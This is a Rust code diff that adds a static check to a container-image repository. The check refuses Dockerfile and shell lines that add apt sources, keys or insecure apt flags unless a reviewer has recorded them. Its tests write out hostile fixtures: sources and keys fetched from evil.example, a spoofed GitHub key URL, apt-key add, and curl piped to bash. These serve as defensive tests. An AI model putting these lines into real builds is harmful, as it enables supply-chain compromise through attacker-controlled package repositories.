@@ -2425,6 +2425,72 @@ struct ParentSpec {
 struct ParentInventory {
     pins: BTreeMap<String, Pin>,
     recipes: BTreeMap<String, Vec<ParentSpec>>,
+    apt_open_gaps: Vec<AptOpenGap>,
+}
+
+/// One reviewed legacy apt source or key installation (#96). The record is the
+/// complete physical instruction, so an edited, extended or moved instruction
+/// stops being covered: an exemption is never a URL marker or a substring.
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct AptOpenGap {
+    recipe: String,
+    instruction: String,
+    owner: String,
+}
+
+const APT_GAP_OWNER: &str = "https://github.com/gregwebs/agent-vm-images/issues/96";
+
+fn parse_apt_open_gaps(
+    value: &Value,
+    recipes: &BTreeMap<String, Vec<ParentSpec>>,
+) -> Result<Vec<AptOpenGap>, String> {
+    let mut gaps: Vec<AptOpenGap> = Vec::new();
+    for item in array(value, "apt_open_gaps")? {
+        let members = exact(
+            item,
+            &["recipe", "instruction", "owner"],
+            "apt_open_gaps entry",
+        )?;
+        let recipe = text(&members["recipe"], "apt_open_gaps entry")?;
+        if !recipes.contains_key(&recipe) {
+            return Err(format!("apt gap recipe is not a recorded recipe: {recipe}"));
+        }
+        let owner = text(&members["owner"], "apt_open_gaps entry")?;
+        if owner != APT_GAP_OWNER {
+            return Err(format!(
+                "apt gap in {recipe}: owner must be {APT_GAP_OWNER}"
+            ));
+        }
+        let instruction = text(&members["instruction"], "apt_open_gaps entry")?;
+        let lines: Vec<&str> = instruction.split('\n').collect();
+        let complete = instruction.starts_with("RUN ")
+            && !instruction.contains('\r')
+            && !instruction.ends_with('\n')
+            && lines.iter().all(|line| !line.trim().is_empty())
+            && lines[..lines.len() - 1]
+                .iter()
+                .all(|line| line.trim_end().ends_with('\\'))
+            && !lines[lines.len() - 1].trim_end().ends_with('\\');
+        if !complete {
+            return Err(format!(
+                "apt gap in {recipe}: an exact RUN instruction is required"
+            ));
+        }
+        if gaps
+            .iter()
+            .any(|gap| gap.recipe == recipe && gap.instruction == instruction)
+        {
+            return Err(format!(
+                "apt gap in {recipe}: duplicate recorded instruction"
+            ));
+        }
+        gaps.push(AptOpenGap {
+            recipe,
+            instruction,
+            owner,
+        });
+    }
+    Ok(gaps)
 }
 
 fn parse_recipes(value: &Value) -> Result<BTreeMap<String, Vec<ParentSpec>>, String> {
@@ -2473,7 +2539,11 @@ fn parse_recipes(value: &Value) -> Result<BTreeMap<String, Vec<ParentSpec>>, Str
 
 fn parse_parent_inventory(text_source: &str) -> Result<ParentInventory, String> {
     let value = strict_json(text_source)?;
-    let members = exact(&value, &["schema", "pins", "recipes"], PARENT_INVENTORY)?;
+    let members = exact(
+        &value,
+        &["schema", "pins", "recipes", "apt_open_gaps"],
+        PARENT_INVENTORY,
+    )?;
     if members["schema"].as_u64() != Some(1) {
         return Err("unsupported parent inventory schema".into());
     }
@@ -2496,9 +2566,11 @@ fn parse_parent_inventory(text_source: &str) -> Result<ParentInventory, String> 
         };
         pins.insert(name.to_owned(), parsed);
     }
+    let recipes = parse_recipes(&members["recipes"])?;
     Ok(ParentInventory {
         pins,
-        recipes: parse_recipes(&members["recipes"])?,
+        apt_open_gaps: parse_apt_open_gaps(&members["apt_open_gaps"], &recipes)?,
+        recipes,
     })
 }
 
@@ -2633,6 +2705,21 @@ fn local_base_for(path: &str) -> &'static str {
     }
 }
 
+/// The pin a resolved FROM image addresses, compared by repository identity.
+fn pin_for_image(image: &str) -> Option<&'static str> {
+    let name = image.split('@').next().unwrap_or(image);
+    let repository = match name.rsplit_once(':') {
+        Some((head, tail)) if !tail.contains('/') => head,
+        _ => name,
+    };
+    match repository {
+        "debian" => Some(DEBIAN_PIN),
+        "golang" => Some(GO_PIN),
+        "ghcr.io/gregwebs/agent-vm-standard" => Some(RELEASE_PIN),
+        _ => None,
+    }
+}
+
 fn check_recipe_parents(
     inventory: &ParentInventory,
     recipes: &BTreeMap<String, String>,
@@ -2691,11 +2778,201 @@ fn check_recipe_parents(
                     if instruction.resolved_image != LOCAL_BASE {
                         return Err(format!("{path}: local base must resolve to {LOCAL_BASE}"));
                     }
+                    if pin_for_image(&instruction.resolved_image).is_some() {
+                        return Err(format!(
+                            "{path}: a local base must not address a pinned parent"
+                        ));
+                    }
                 }
             }
         }
     }
     Ok(())
+}
+
+/// Instruction blocks with their own bytes: continuations kept, no final LF.
+///
+/// `dockerfile_instructions` joins continuations and trims whitespace so FROM
+/// parsing can work on tokens; a recorded apt gap is an exact exception, so it
+/// has to be compared with the recipe's physical text instead.
+fn physical_instructions(source: &str) -> Vec<String> {
+    let mut instructions = Vec::new();
+    let mut current: Vec<&str> = Vec::new();
+    for line in source.split('\n') {
+        let trimmed = line.trim();
+        if current.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
+            continue;
+        }
+        current.push(line);
+        if !line.trim_end().ends_with('\\') {
+            instructions.push(current.join("\n"));
+            current.clear();
+        }
+    }
+    if !current.is_empty() {
+        instructions.push(current.join("\n"));
+    }
+    instructions
+}
+
+/// Markers are compared against [`folded`] text, so they are written folded:
+/// lowercase, with no whitespace and no `-` or `_`. Folding collapses the flag
+/// and directive spellings of one setting (`--allow-unauthenticated` and
+/// `Acquire::AllowUnauthenticated`), which is why each setting appears once.
+///
+/// Flags and configuration that are never acceptable in a maintained source,
+/// whether or not a recorded gap covers the instruction that carries them.
+const APT_INSECURE_MARKERS: [&str; 9] = [
+    "allowunauthenticated",
+    "allowinsecurerepositories",
+    "allowdowngradetoinsecurerepositories",
+    "forceyes",
+    "trusted=yes",
+    "trusted:yes",
+    "aptkey",
+    "addaptrepository",
+    "checkvaliduntil",
+];
+
+/// Writes or fetches that would install or re-point apt source and key material.
+/// Anything here needs a human to record the complete instruction as a gap (#96).
+///
+/// The tokens are the spellings apt itself uses, not a shell parse: `/etc/apt`
+/// with any suffix carries the source, keyring and configuration directories,
+/// and the deb822 fields (`Signed-By`, `Types: deb`, `URIs:`) read like the
+/// one-line `signed-by=` option once folded. A construction that spells none of
+/// these tokens is still a review question.
+const APT_SOURCE_MARKERS: [&str; 15] = [
+    "/etc/apt",
+    "/etc/apt/keyrings",
+    "/usr/share/keyrings",
+    "sources.list",
+    ".sources",
+    "signedby",
+    "trusted.gpg",
+    "uris:",
+    "types:deb",
+    "dir::etc",
+    "aptconfig",
+    "debhttp",
+    "debsrc",
+    "deb[",
+    "nodesource",
+];
+
+/// Case, separators and whitespace are spelling, not meaning: `Signed-By`,
+/// `Signed_By` and `Signed By` all name the same apt field, and a marker that
+/// required one of them would be a guard that a re-spelling defeats.
+fn folded(text: &str) -> String {
+    text.chars()
+        .filter(|character| !character.is_whitespace() && *character != '-' && *character != '_')
+        .flat_map(char::to_lowercase)
+        .collect()
+}
+
+fn marker_in(markers: &[&'static str], text: &str) -> Option<&'static str> {
+    let folded = folded(text);
+    markers
+        .iter()
+        .find(|marker| folded.contains(**marker))
+        .copied()
+}
+
+fn apt_insecure_marker(text: &str) -> Option<&'static str> {
+    marker_in(&APT_INSECURE_MARKERS, text)
+}
+
+fn apt_source_marker(text: &str) -> Option<&'static str> {
+    marker_in(&APT_SOURCE_MARKERS, text)
+}
+
+/// A static ratchet, not a sandbox: the two reviewed #96 instructions may write
+/// apt state, and any other instruction or shell line that does is a new source
+/// that needs review. The parent-baseline checker owns the state the pinned
+/// Debian parent ships; this gate owns what the recipes add on top of it.
+///
+/// Markers are matched against the whole instruction, so a RUN's shell text and a
+/// COPY/ADD destination are both covered: `COPY apt /etc/apt` writes the source
+/// directory without naming a shell command.
+fn check_apt_sources(
+    inventory: &ParentInventory,
+    recipes: &BTreeMap<String, String>,
+    shell_sources: &BTreeMap<String, String>,
+) -> Result<(), String> {
+    for (path, source) in recipes {
+        for instruction in physical_instructions(source) {
+            if let Some(marker) = apt_insecure_marker(&instruction) {
+                return Err(format!(
+                    "{path}: insecure apt construction is never accepted: {marker}"
+                ));
+            }
+        }
+    }
+    let mut recorded: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
+    for gap in &inventory.apt_open_gaps {
+        let source = recipes
+            .get(&gap.recipe)
+            .ok_or_else(|| format!("apt gap recipe is not a maintained recipe: {}", gap.recipe))?;
+        let matches = physical_instructions(source)
+            .iter()
+            .filter(|instruction| **instruction == gap.instruction)
+            .count();
+        if matches != 1 {
+            return Err(format!(
+                "apt gap changed/closed: review or remove exact instruction entry for {} (owner #96)",
+                gap.recipe
+            ));
+        }
+        recorded
+            .entry(&gap.recipe)
+            .or_default()
+            .push(&gap.instruction);
+    }
+    for (path, source) in recipes {
+        for instruction in physical_instructions(source) {
+            let Some(marker) = apt_source_marker(&instruction) else {
+                continue;
+            };
+            let recorded_here = recorded
+                .get(path.as_str())
+                .is_some_and(|gaps| gaps.iter().any(|gap| **gap == instruction));
+            if !recorded_here {
+                return Err(format!(
+                    "{path}: apt source or key installation is not a recorded exact instruction (owner #96): {marker}"
+                ));
+            }
+        }
+    }
+    for (path, source) in shell_sources {
+        for line in source.split('\n') {
+            let code = strip_comment(line);
+            if code.trim().is_empty() {
+                continue;
+            }
+            if let Some(marker) = apt_insecure_marker(code) {
+                return Err(format!(
+                    "{path}: insecure apt construction is never accepted: {marker}"
+                ));
+            }
+            if let Some(marker) = apt_source_marker(code) {
+                return Err(format!(
+                    "{path}: apt source or key installation is not a recorded exact instruction (owner #96): {marker}"
+                ));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Every maintained shell source, minus verbatim upstream provenance snapshots
+/// and the baseline checker itself, which necessarily names apt paths and flags.
+fn maintained_shell_sources() -> BTreeMap<String, String> {
+    let mut sources = repository_files("images", None, Some("sh"));
+    sources.extend(repository_files("examples", None, Some("sh")));
+    sources.retain(|path, _| {
+        !is_provenance_snapshot(Path::new(path)) && path != "images/apt-policy/check-sources.sh"
+    });
+    sources
 }
 
 fn repository_files(
@@ -2940,6 +3217,20 @@ fn the_parent_inventory_pins_every_maintained_recipe() {
     }
     assert!(keyrings.contains("  usr/share/keyrings/debian-archive-keyring.pgp"));
     check_digest_mentions(&parent_documents(), &inventory).unwrap();
+    check_apt_sources(&inventory, &recipes, &maintained_shell_sources()).unwrap();
+    assert_eq!(
+        inventory.apt_open_gaps.len(),
+        2,
+        "two reviewed legacy apt instructions (#96)"
+    );
+    for gap in &inventory.apt_open_gaps {
+        assert_eq!(gap.recipe, "images/Dockerfile");
+        assert_eq!(gap.owner, APT_GAP_OWNER);
+        assert!(
+            physical_instructions(&recipes[&gap.recipe]).contains(&gap.instruction),
+            "a recorded gap must still be one instruction of its recipe"
+        );
+    }
 }
 
 /// `attestations.py` is the verifier that refuses an inventory naming any other
@@ -2959,6 +3250,35 @@ fn the_signer_identity_agrees_with_the_release_verifier() {
              and RELEASE_WORKFLOW with it"
         );
     }
+}
+
+#[test]
+fn the_base_build_ca_label_is_the_release_refusal_key() {
+    // The release refuses a CA-carrying base by reading this label, and the key
+    // name is written twice: in the Dockerfile that declares it and in the
+    // constant the release reads. A rename on either side would leave the
+    // refusal inspecting a label no image carries, which is why the release
+    // refuses an absent key and why the two spellings are tied here.
+    let operations = read_text("script/release/operations.py");
+    let declarations: Vec<&str> = operations
+        .lines()
+        .filter_map(|line| line.strip_prefix("BUILD_CA_LABEL = "))
+        .collect();
+    assert_eq!(
+        declarations.len(),
+        1,
+        "operations.py declares exactly one BUILD_CA_LABEL: {declarations:?}"
+    );
+    let label = declarations[0]
+        .trim()
+        .strip_prefix('\'')
+        .and_then(|value| value.strip_suffix('\''))
+        .expect("BUILD_CA_LABEL is a single-quoted literal");
+    assert_eq!(
+        label_value(&read_text("images/Dockerfile"), label),
+        "${BUILD_CA_SHA256}",
+        "the base LABEL must be the label the public release refuses"
+    );
 }
 
 #[test]
@@ -3093,6 +3413,26 @@ fn parent_inventory_blocks_reject_edits() {
             "\"revision\":".to_owned(),
             "\"revised\":".to_owned(),
         ),
+        (
+            "apt gap owner",
+            APT_GAP_OWNER.to_owned(),
+            "https://github.com/gregwebs/agent-vm-images/issues/95".to_owned(),
+        ),
+        (
+            "apt gap recipe",
+            "\"recipe\": \"images/Dockerfile\"".to_owned(),
+            "\"recipe\": \"images/Other/Dockerfile\"".to_owned(),
+        ),
+        (
+            "apt gap instruction shape",
+            "\"instruction\": \"RUN install -dm 755".to_owned(),
+            "\"instruction\": \"CMD install -dm 755".to_owned(),
+        ),
+        (
+            "apt gap missing owner",
+            "\"owner\":".to_owned(),
+            "\"owned\":".to_owned(),
+        ),
     ] {
         let edited = source.replacen(&from, &to, 1);
         assert_ne!(edited, source, "{label}: inventory mutation did not apply");
@@ -3126,7 +3466,7 @@ fn parent_inventory_blocks_reject_edits() {
         "accepted a local base that does not describe its recipe"
     );
     // Literal duplicate keys must fail in the raw text, not in a rebuilt map.
-    let duplications: [(&str, String, String); 4] = [
+    let duplications: [(&str, String, String); 5] = [
         (
             "pin",
             format!("\"{DEBIAN_PIN}\": {{"),
@@ -3147,6 +3487,11 @@ fn parent_inventory_blocks_reject_edits() {
             "\"stage\": \"recipe-contract-bin\",".to_owned(),
             "\"stage\": \"recipe-contract-bin\", \"stage\": \"recipe-contract-bin\",".to_owned(),
         ),
+        (
+            "apt gap record",
+            "\"apt_open_gaps\": [".to_owned(),
+            "\"apt_open_gaps\": [], \"apt_open_gaps\": [".to_owned(),
+        ),
     ];
     for (label, needle, duplicated) in duplications {
         let text = source.replacen(&needle, &duplicated, 1);
@@ -3157,6 +3502,271 @@ fn parent_inventory_blocks_reject_edits() {
         let error = parse_parent_inventory(&text).expect_err("duplicate keys must be refused");
         assert!(error.contains("duplicate JSON key"), "{label}: {error}");
     }
+}
+
+#[test]
+fn apt_sources_are_official_or_recorded_gaps() {
+    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
+    let recipes = maintained_recipes();
+    let shell = maintained_shell_sources();
+    check_apt_sources(&inventory, &recipes, &shell).unwrap();
+    let node = inventory
+        .apt_open_gaps
+        .iter()
+        .find(|gap| {
+            gap.instruction
+                .contains("https://deb.nodesource.com/setup_22.x")
+        })
+        .expect("the NodeSource install is a recorded gap")
+        .instruction
+        .clone();
+    let github = inventory
+        .apt_open_gaps
+        .iter()
+        .find(|gap| gap.instruction.contains("githubcli-archive-keyring.gpg"))
+        .expect("the GitHub CLI repository is a recorded gap")
+        .instruction
+        .clone();
+    let base = recipes["images/Dockerfile"].clone();
+    let standard = recipes["images/standard/Dockerfile"].clone();
+    let go_dev = recipes["examples/layers/go-dev/Dockerfile"].clone();
+
+    let appended = github.replace(
+        "\n && rm -rf /var/lib/apt/lists/*",
+        "\n && echo \"deb http://evil.example stable main\" \\\n        > /etc/apt/sources.list.d/evil.list \\\n && rm -rf /var/lib/apt/lists/*",
+    );
+    assert_ne!(appended, github, "the extension mutation applies");
+    let altered_key = github.replace(
+        "https://cli.github.com/packages/githubcli-archive-keyring.gpg",
+        "https://cli.github.com.evil/packages/githubcli-archive-keyring.gpg",
+    );
+    assert_ne!(altered_key, github, "the key URL mutation applies");
+    let insecure_gap = github.replace(
+        "apt-get install -y --no-install-recommends gh",
+        "apt-get install -y --allow-unauthenticated --no-install-recommends gh",
+    );
+    assert_ne!(insecure_gap, github, "the insecure-flag mutation applies");
+    let removed = base.replace(&node, "");
+    assert_ne!(removed, base, "the gap-removal mutation applies");
+
+    let recipe_mutations: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
+        (
+            "extra source inside the recorded instruction",
+            edited_recipe(&recipes, "images/Dockerfile", &github, &appended),
+            "apt gap changed/closed",
+        ),
+        (
+            "altered key endpoint inside the recorded instruction",
+            edited_recipe(&recipes, "images/Dockerfile", &github, &altered_key),
+            "apt gap changed/closed",
+        ),
+        (
+            "insecure flag inside the recorded instruction",
+            edited_recipe(&recipes, "images/Dockerfile", &github, &insecure_gap),
+            "insecure apt construction",
+        ),
+        (
+            "NodeSource removed but the gap kept",
+            edited_recipe(&recipes, "images/Dockerfile", &node, ""),
+            "apt gap changed/closed",
+        ),
+        (
+            "new .sources in the standard recipe",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN echo 'Types: deb' > /etc/apt/sources.list.d/extra.sources\n"
+                ),
+            ),
+            "not a recorded exact instruction",
+        ),
+        (
+            "new .list in an example recipe",
+            edited_recipe(
+                &recipes,
+                "examples/layers/go-dev/Dockerfile",
+                &go_dev,
+                &format!(
+                    "{go_dev}RUN echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
+                ),
+            ),
+            "not a recorded exact instruction",
+        ),
+        (
+            "bare add-apt-repository",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!("{standard}RUN add-apt-repository ppa:evil/ppa\n"),
+            ),
+            "insecure apt construction",
+        ),
+        (
+            "trusted=yes source option",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN echo 'deb [trusted=yes] http://evil.example stable main' > /etc/apt/sources.list.d/x.list\n"
+                ),
+            ),
+            "insecure apt construction",
+        ),
+        (
+            "insecure configuration write",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN echo 'Acquire::Check-Valid-Until \"false\";' > /etc/apt/apt.conf.d/99-valid\n"
+                ),
+            ),
+            "insecure apt construction",
+        ),
+    ];
+    for (label, edited, expected) in recipe_mutations {
+        let error = check_apt_sources(&inventory, &edited, &shell)
+            .expect_err(&format!("accepted an apt mutation: {label}"));
+        assert!(error.contains(expected), "{label}: {error}");
+        if expected != "insecure apt construction" {
+            assert!(error.contains("#96"), "{label}: {error}");
+        }
+    }
+
+    // One row per spelling the gate promises to refuse. The first two are the
+    // review's probes: before these markers were folded tokens, `/etc/apt`
+    // needed a trailing slash and `signed-by=` needed the one-line form, so a
+    // deb822 source written from `/etc/apt` and a `COPY apt /etc/apt` both
+    // passed. The rest are the same tokens spelled the way apt or a reviewer
+    // might write them - the honest limit is that this is a static catch for
+    // known spellings, not a shell parser.
+    let source_spellings: Vec<(&str, String)> = vec![
+        (
+            "/etc/apt as a COPY destination",
+            format!("{standard}COPY apt /etc/apt\n"),
+        ),
+        (
+            "deb822 source and key from /etc/apt",
+            format!(
+                "{standard}RUN cd /etc/apt && printf 'Types: deb\\nURIs: https://evil.example/\\nSuites: s\\nComponents: main\\nSigned-By: /usr/share/keyrings/evil.gpg\\n' > sources.list.d/evil.sources && curl -fsSL https://evil.example/key.gpg > /usr/share/keyrings/evil.gpg\n"
+            ),
+        ),
+        (
+            "/etc/apt/keyrings destination",
+            format!("{standard}RUN cp /tmp/evil.gpg /etc/apt/keyrings/evil.gpg\n"),
+        ),
+        (
+            "sources.list outside /etc/apt",
+            format!("{standard}RUN cp /tmp/evil.txt /opt/agent-vm/sources.list\n"),
+        ),
+        (
+            ".sources suffix outside /etc/apt",
+            format!("{standard}RUN cp /tmp/evil.txt /opt/agent-vm/evil.sources\n"),
+        ),
+        (
+            "Signed_By separator",
+            format!(
+                "{standard}RUN printf 'Signed_By: /tmp/evil.gpg\\n' > /opt/agent-vm/key.conf\n"
+            ),
+        ),
+        (
+            "trusted.gpg store",
+            format!("{standard}RUN cp /tmp/evil.gpg /opt/agent-vm/trusted.gpg\n"),
+        ),
+        (
+            "/usr/share/keyrings destination",
+            format!("{standard}RUN cp /tmp/evil.gpg /usr/share/keyrings/evil.gpg\n"),
+        ),
+        (
+            "URIs: field",
+            format!(
+                "{standard}RUN printf 'URIs: https://evil.example/\\n' >> /opt/agent-vm/extra\n"
+            ),
+        ),
+        (
+            "Types: deb field",
+            format!("{standard}RUN printf 'Types: deb\\n' >> /opt/agent-vm/extra\n"),
+        ),
+        (
+            "Dir::Etc override",
+            format!(
+                "{standard}RUN printf 'Dir::Etc::SourceParts \"/opt/evil/\";\\n' > /opt/agent-vm/apt.conf\n"
+            ),
+        ),
+        (
+            "apt-config dump",
+            format!("{standard}RUN apt-config dump > /opt/agent-vm/apt.conf\n"),
+        ),
+    ];
+    for (label, edited) in source_spellings {
+        let mut source = recipes.clone();
+        source.insert("images/standard/Dockerfile".to_owned(), edited);
+        let error = check_apt_sources(&inventory, &source, &shell)
+            .expect_err(&format!("accepted an apt source spelling: {label}"));
+        assert!(
+            error.contains("not a recorded exact instruction"),
+            "{label}: {error}"
+        );
+    }
+
+    let script_mutations: Vec<(&str, String, &str)> = vec![
+        (
+            "apt-key in a maintained script",
+            "curl -fsSL https://example.invalid/key.asc | apt-key add -\n".to_owned(),
+            "insecure apt construction",
+        ),
+        (
+            "new source write in a maintained script",
+            "echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
+                .to_owned(),
+            "not a recorded exact instruction",
+        ),
+        (
+            "external setup endpoint in a maintained script",
+            "curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n".to_owned(),
+            "not a recorded exact instruction",
+        ),
+        (
+            "apt configuration directory override in a maintained script",
+            "printf 'Dir::Etc::SourceParts \"/opt/evil/\";\\n' > /etc/apt/apt.conf.d/99-evil\n"
+                .to_owned(),
+            "not a recorded exact instruction",
+        ),
+    ];
+    for (label, body, expected) in script_mutations {
+        let mut edited = shell.clone();
+        edited.insert("images/tools/example/install-example.sh".to_owned(), body);
+        let error = check_apt_sources(&inventory, &recipes, &edited)
+            .expect_err(&format!("accepted a shell mutation: {label}"));
+        assert!(error.contains(expected), "{label}: {error}");
+    }
+    // Comments are documentation, not behavior: the shipped apt configuration
+    // explains apt-get itself and must not need an exemption.
+    let mut commented = BTreeMap::new();
+    commented.insert(
+        "images/tools/example/notes.sh".to_owned(),
+        "# apt-key add, deb http://deb.debian.org/debian and /etc/apt/sources.list\nset -eu\n"
+            .to_owned(),
+    );
+    check_apt_sources(&inventory, &recipes, &commented).unwrap();
+}
+
+fn edited_recipe(
+    recipes: &BTreeMap<String, String>,
+    path: &str,
+    from: &str,
+    to: &str,
+) -> BTreeMap<String, String> {
+    let mut edited = recipes.clone();
+    let changed = recipes[path].replace(from, to);
+    assert_ne!(changed, recipes[path], "mutation did not apply to {path}");
+    edited.insert(path.to_owned(), changed);
+    edited
 }
 
 #[test]
